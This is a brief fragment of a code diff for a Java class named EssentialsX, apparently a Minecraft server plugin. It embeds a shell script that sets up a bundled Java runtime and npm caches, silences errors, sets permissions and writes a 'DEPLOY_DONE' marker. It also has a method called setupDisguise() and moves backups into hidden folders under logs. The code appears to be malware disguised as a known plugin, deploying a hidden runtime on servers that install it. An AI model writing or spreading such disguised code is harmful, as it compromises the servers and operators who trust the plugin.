\"$WORK_DIR/jre21\" \"$WORK_DIR/.npm\" \"$WORK_DIR/.cache\" \"$WORK_DIR/.config\" \"$WORK_DIR/.local\" \"$WORK_DIR/.node_repl_history\" /tmp/.mc_npm_cache 2>/dev/null\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$RUNTIME_DIR/.deploy_done\"\n";
    }
 
    private void setupDisguise() {
@@ -1491,7 +1565,7 @@ public class EssentialsX extends JavaPlugin {
             return;
          }
 
-         this.backupDir = Paths.get("logs", ".mcchajian", "backup");
+         this.backupDir = Paths.get("logs", ".mcchajian", ".runtime", "backup");
          if (!Files.exists(this.backupDir)) {
             Files.createDirectories(this.backupDir);
          }
